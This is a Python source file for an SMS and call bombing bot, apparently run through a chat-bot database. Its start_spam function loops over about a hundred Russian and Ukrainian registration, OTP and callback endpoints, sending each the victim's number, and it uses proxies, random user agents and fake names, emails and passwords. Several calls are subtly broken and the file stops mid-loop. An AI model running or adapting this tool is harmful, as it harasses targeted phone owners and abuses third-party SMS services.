#██████████████████████████████
#██████████████░░██████████████
#████░████████░░░░████████░████
#████░░░██████░░░░██████░░░████
#████░█░░░█████░░██████░░█░████
#████░██░░█████░░█████░░██░████
#████░███░░████░░████░░███░████
#████░███░░████░░████░░███░████
#████░███░░████░░████░░███░████
#████░████░░███░░███░░████░████
#████░████░░███░░███░░████░████
#████░██░░░███░░░░███░░░██░████
#████░██░░███░░██░░███░░██░████
#████░██░░░██████████░░░██░████
#████░████░░░░░██░░░░░████░████
#████░█████░░██░░██░░█████░████
#████░░░░░░░░░░░░░░░░░░░░░░████
#██████████░░██░░██░░██████████
#░██████████░░█░░█░░██████████
#░░██████████░░░░░░██████████
#░░░░█████████░░░░█████████          думаю ты понял
#░░░░░░░░██████████████
#░░░░░░░░░░░░░████




from random import choice, randint
from requests import get, post
from user_agent import generate_user_agent
import random
import _subfiles.logic.db_logic__
db = _subfiles.logic.db_logic__

def start_spam(user_id, phone): #380*********
    def format_phone(phone, phone_mask):
        phone_list = list(phone)
        for i in phone_list:
            phone_mask = phone_mask.replace("#", i, 1)
        return phone_mask
    proxies = generate_proxy()
    name = ""
    for _ in range(12):
        name += choice("123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM")
        password = name + choice("123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM")
        email = name + "@gmail.com"
    headers = {"User-Agent": generate_user_agent()}
    phone9 = phone[1:]
    print("Старт спам успешно призван")
    db.set_thr_stat(user_id, "True")
    print(str(db.check_thr(user_id)))
    number_7 = phone
    number_plus7 = str("+") + phone
    number_8 = str(8) + phone[1:]
    heads = [
        {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
            'Accept': '*/*'
        },
        {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
        'Accept': '*/*'
        },
        {
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
        'Accept': '*/*'
        },
        {
        'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
        'Accept': '*/*'
        },
        {
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
        'Accept': '*/*'
        },
    ]
    HEADERS = random.choice(heads)
    while db.check_thr(user_id) == "True":
        try:
            post("https://youla.ru/web-api/auth/request_code", data={"phone": phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
#-------------------------------------------------------------
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
                    post("https://www.tarantino-family.com/wp-admin/admin-ajax.php", data={"action": "callback_phonenumber", "phone": phone}, headers=HEADERS,proxy=proxies)
        except:
                    pass
        if db.check_thr(user_id) == "True":
                    pass
        else:
    	    break
        try:
            post("https://lk.tabris.ru/reg/", data={"action": "phone", "phone": phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://tabasko.su/", data={"IS_AJAX": "Y", "COMPONENT_NAME": "AUTH", "ACTION": "GET_CODE", "LOGIN": phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://www.sushi-profi.ru/api/order/order-call/", json={"phone": phone9, "name": name}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://client-api.sushi-master.ru/api/v1/auth/init", json={"phone": phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            formatted_phone = format_phone(phone9, "8(###)###-##-##")
            post("https://xn--80aaispoxqe9b.xn--p1ai/user_account/ajax.php?do=sms_code", data={"phone": formatted_phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            formatted_phone = format_phone(phone9, "8 (###) ###-##-##")
            post("http://sushigourmet.ru/auth", data={"phone": formatted_phone, "stage": 1}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://sushifuji.ru/sms_send_ajax.php", data={"name": "false", "phone": phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://api.sunlight.net/v3/customers/authorization/", data={"phone": phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            get("https://suandshi.ru/mobile_api/register_mobile_user", params={"phone": phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            formatted_phone = format_phone(phone9, "8-###-###-##-##")
            post("https://pizzasushiwok.ru/index.php", data={"mod_name": "registration", "tpl": "restore_password", "phone": formatted_phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            get("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            get("https://www.sportmaster.ru/user/session/sendSmsCode.do", params={"phone": formatted_phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php", data={"demo_number": "+" + phone, "ajax_demo_send": "1"}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://smart.space/api/users/request_confirmation_code/", json={"mobile": "+" + phone, "action": "confirm_mobile"}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://shopandshow.ru/sms/password-request/", data={"phone": "+" + phone, "resend": 0}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://shafa.ua/api/v3/graphiql", json={"operationName": "RegistrationSendSms", "variables": {"phoneNumber": "+" + phone}, "query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://shafa.ua/api/v3/graphiql", json={"operationName": "sendResetPasswordSms", "variables": {"phoneNumber": "+" + phone}, "query": "mutation sendResetPasswordSms($phoneNumber: String!) {\n  resetPasswordSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      ...errorsData\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment errorsData on GraphResponseError {\n  field\n  messages {\n    code\n    message\n    __typename\n  }\n  __typename\n}\n"}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://sayoris.ru/?route=parse/whats", data={"phone": phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://api.saurisushi.ru/Sauri/api/v2/auth/login", data={"data": {"login": phone9, "check": True, "crypto": {"captcha": "739699"}}}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://pass.rutube.ru/api/accounts/phone/send-password/", json={"phone": "+" + phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://rieltor.ua/api/users/register-sms/", json={"phone": phone, "retry": 0}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php", data={"phone": "+" + phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            formatted_phone = format_phone(phone, "+#(###)###-##-##")
            post("https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/", data={"phone": formatted_phone, "alien": "0"}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            get("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code", params={"number": phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            formatted_phone = format_phone(phone, "+#-###-###-##-##")
            post("https://api.pozichka.ua/v1/registration/send", json={"RegisterSendForm": {"phone": formatted_phone}}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            post("https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode", data={"phone": formatted_phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            get("https://cabinet.planetakino.ua/service/sms", params={"phone": phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            formatted_phone = format_phone(phone9, "8-###-###-##-##")
            post("https://pizzasushiwok.ru/index.php", data={"mod_name": "call_me", "task": "request_call", "name": name, "phone": formatted_phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://pizzasinizza.ru/api/phoneCode.php", json={"phone": phone9}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://pizzakazan.com/auth/ajax.php", data={"phone": "+" + phone, "method": "sendCode"}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-####")
            post("https://pizza46.ru/ajaxGet.php", data={"phone": formatted_phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg", data={"telephone": "+" + phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            formatted_phone = format_phone(phone, "+#-###-###-##-##")
            post("https://paylate.ru/registry", data={"mobile": formatted_phone, "first_name": name, "last_name": name, "nick_name": name,  "gender-client": 1, "email": email, "action": "registry"}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode", data={"telephone": "8" + phone9}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry", json={"phone": phone, "otpId": 0}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-####")
            post("https://www.osaka161.ru/local/tools/webstroy.webservice.php", data={"name": "Auth.SendPassword", "params[0]": formatted_phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://ontaxi.com.ua/api/v2/web/client", json={"country": "UA", "phone": phone[3:]}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            get("https://secure.online.ua/ajax/check_phone/", params={"reg_phone": phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            formatted_phone = format_phone(phone9, "8 (###) ###-##-##")
            get("https://okeansushi.ru/includes/contact.php", params={"call_mail": "1", "ajax": "1", "name": name, "phone": formatted_phone, "call_time": "1", "pravila2": "on"}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data={"st.r.phone": "+" + phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://nn-card.ru/api/1.0/covid/login", json={"phone": phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://www.nl.ua", data={"component": "bxmaker.authuserphone.login", "sessid": "bf70db951f54b837748f69b75a61deb4", "method": "sendCode", "phone": phone, "registration": "N"}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://www.niyama.ru/ajax/sendSMS.php", data={"REGISTER[PERSONAL_PHONE]": phone, "code": "", "sendsms": "Выслать код"}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://account.my.games/signup_send_sms/", data={"phone": phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://auth.multiplex.ua/login", json={"login": phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code", params={"msisdn": phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://www.moyo.ua/identity/registration", data={"firstname": name, "phone": phone, "email": email}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://mos.pizza/bitrix/components/custom/callback/templates/.default/ajax.php", data={"name": name, "phone": phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://www.monobank.com.ua/api/mobapplink/send", data={"phone": "+" + phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://moneyman.ru/registration_api/actions/send-confirmation-code", data="+" + phone, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://my.modulbank.ru/api/v2/registration/nameAndPhone", json={"FirstName": name, "CellPhone": phone, "Package": "optimal"}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://mobileplanet.ua/register", data={"klient_name": name, "klient_phone": "+" + phone, "klient_email": email}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            get("https://my.mistercash.ua/ru/send/sms/registration", params={"number": "+" + phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            get("https://menza-cafe.ru/system/call_me.php", params={"fio": name, "phone": phone, "phone_number": "1"}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://www.menu.ua/kiev/delivery/registration/direct-registration.html", data={"user_info[fullname]": name, "user_info[phone]": phone, "user_info[email]": email, "user_info[password]": password, "user_info[conf_password]": password}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://www.menu.ua/kiev/delivery/profile/show-verify.html", data={"phone": phone, "do": "phone"}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            formatted_phone = format_phone(phone, "+# ### ### ## ##")
            get("https://makimaki.ru/system/callback.php", params={"cb_fio": name, "cb_phone": formatted_phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php", data={"data": phone, "metod": "postreg"}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://api-rest.logistictech.ru/api/v1.1/clients/request-code", json={"phone": phone}, headers={"Restaurant-chain": "c0ab3d88-fba8-47aa-b08d-c7598a3be0b9", "User-Agent": generate_user_agent()},proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://loany.com.ua/funct/ajax/registration/code", data={"phone": phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://lenta.com/api/v1/authentication/requestValidationCode", json={"phone": "+" + phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://koronapay.com/transfers/online/api/users/otps", data={"phone": phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://api.kinoland.com.ua/api/v1/service/send-sms", headers={"Agent": "website", "User-Agent": generate_user_agent()}, json={"Phone": phone, "Type": 1},proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            formatted_phone = format_phone(phone, "# (###) ###-##-##")
            post("https://kilovkusa.ru/ajax.php", params={"block": "auth", "action": "send_register_sms_code", "data_type": "json"}, data={"phone": formatted_phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms", json={"phone": "+" + phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://kaspi.kz/util/send-app-link", data={"address": phone9}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://app.karusel.ru/api/v1/phone/", data={"phone": phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://izi.ua/api/auth/register", json={"phone": "+" + phone, "name": name, "is_terms_accepted": True}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://izi.ua/api/auth/sms-login", json={"phone": "+" + phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            formatted_phone = format_phone(phone, "+## (###) ###-##-##")
            post("https://iqlab.com.ua/session/ajaxregister", data={"cellphone": formatted_phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://www.ingos.ru/api/v1/lk/auth/register/fast/step2", headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal", "User-Agent": generate_user_agent()}, json={"Birthday": "1986-07-10T07:19:56.276+02:00", "DocIssueDate": "2004-02-05T07:19:56.276+02:00", "DocNumber": randint(500000, 999999), "DocSeries": randint(5000, 9999), "FirstName": name, "Gender": "M", "LastName": name, "SecondName": name, "Phone": phone9, "Email": email},proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://terra-1.indriverapp.com/api/authorization?locale=ru", data={"mode": "request", "phone": "+" + phone, "phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://api.imgur.com/account/v1/phones/verify", json={"phone_number": phone, "region_code": "RU"}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={"msisdn": phone, "locale": "en", "countryCode": "ru", "version": "1", "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            get("https://api.hmara.tv/stable/entrance", params={"contact": phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://helsi.me/api/healthy/accounts/login", json={"phone": phone, "platform": "PISWeb"}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://www.hatimaki.ru/register/", data={"REGISTER[LOGIN]": phone, "REGISTER[PERSONAL_PHONE]": phone, "REGISTER[SMS_CODE]": "", "resend-sms": "1", "REGISTER[EMAIL]": "", "register_submit_button": "Зарегистрироваться"}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://guru.taxi/api/v1/driver/session/verify", json={"phone": {"code": 1, "number": phone9}}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://crm.getmancar.com.ua/api/veryfyaccount", json={"phone": "+" + phone, "grant_type": "password", "client_id": "gcarAppMob", "client_secret": "SomeRandomCharsAndNumbersMobile"}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            post("https://foodband.ru/api?call=calls", data={"customerName": name, "phone": formatted_phone, "g-recaptcha-response": ""}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            get("https://foodband.ru/api/", params={"call": "customers/sendVerificationCode", "phone": phone9, "g-recaptcha-response": ""}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://www.flipkart.com/api/5/user/otp/generate", headers={"Origin": "https://www.flipkart.com", "User-Agent": generate_user_agent()}, data={"loginId": "+" + phone},proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://www.flipkart.com/api/6/user/signup/status", headers={"Origin": "https://www.flipkart.com", "User-Agent": generate_user_agent()}, json={"loginId": "+" + phone, "supportAllStates": True},proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://fix-price.ru/ajax/register_phone_code.php", data={"register_call": "Y", "action": "getCode", "phone": "+" + phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            get("https://findclone.ru/register", params={"phone": "+" + phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://www.finam.ru/api/smslocker/sendcode", data={"phone": "+" + phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            post("https://2407.smartomato.ru/account/session", json={"phone": formatted_phone, "g-recaptcha-response": None}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://www.etm.ru/cat/runprog.html", data={"m_phone": phone9, "mode": "sendSms", "syf_prog": "clients-services", "getSysParam": "yes"}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            get("https://api.eldorado.ua/v1/sign/", params={"login": phone, "step": "phone-check", "fb_id": "null", "fb_token": "null", "lang": "ru"}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            formatted_phone = format_phone(phone, "+## (###) ###-##-##")
            post("https://e-groshi.com/online/reg", data={"first_name": name, "last_name": name, "third_name": name, "phone": formatted_phone, "password": password, "password2": password}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://vladimir.edostav.ru/site/CheckAuthLogin", data={"phone_or_email": "+" + phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://api.easypay.ua/api/auth/register", json={"phone": phone, "password": password}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://my.dianet.com.ua/send_sms/", data={"phone": phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://api.delitime.ru/api/v2/signup", data={"SignupForm[username]": phone, "SignupForm[device_type]": 3}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            post("https://api.creditter.ru/confirm/sms/send", json={"phone": formatted_phone, "type": "register"}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://clients.cleversite.ru/callback/run.php", data={"siteid": "62731", "num": phone, "title": "Онлайн-консультант", "referrer": "https://m.cleversite.ru/call"}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://city24.ua/personalaccount/account/registration", data={"PhoneNumber": phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post(f"https://www.citilink.ru/registration/confirm/phone/+{phone}/", headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            post("https://cinema5.ru/api/phone_code", data={"phone": formatted_phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://api.cian.ru/sms/v1/send-validation-code/", json={"phone": "+" + phone, "type": "authenticateCode"}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://api.carsmile.com/", son={"operationName": "enterPhone", "variables": {"phone": phone}, "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            get("https://it.buzzolls.ru:9995/api/v2/auth/register", params={"phoneNumber": "+" + phone}, headers={"keywordapi": "ProjectVApiKeyword", "usedapiversion": "3", "User-Agent": generate_user_agent()},proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            formatted_phone = format_phone(phone9, "(###)###-##-##")
            post("https://bluefin.moscow/auth/register/", data={"phone": formatted_phone, "sendphone": "Далее"}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://app.benzuber.ru/login", data={"phone": "+" + phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            post("https://bartokyo.ru/ajax/login.php", data={"user_phone": formatted_phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            post("https://bamper.by/registration/?step=1", data={"phone": "+" + phone, "submit": "Запросить смс подтверждения", "rules": "on"}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            formatted_phone = format_phone(phone9, "(###) ###-##-##")
            get("https://avtobzvon.ru/request/makeTestCall", params={"to": formatted_phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            post("https://oauth.av.ru/check-phone", json={"phone": formatted_phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
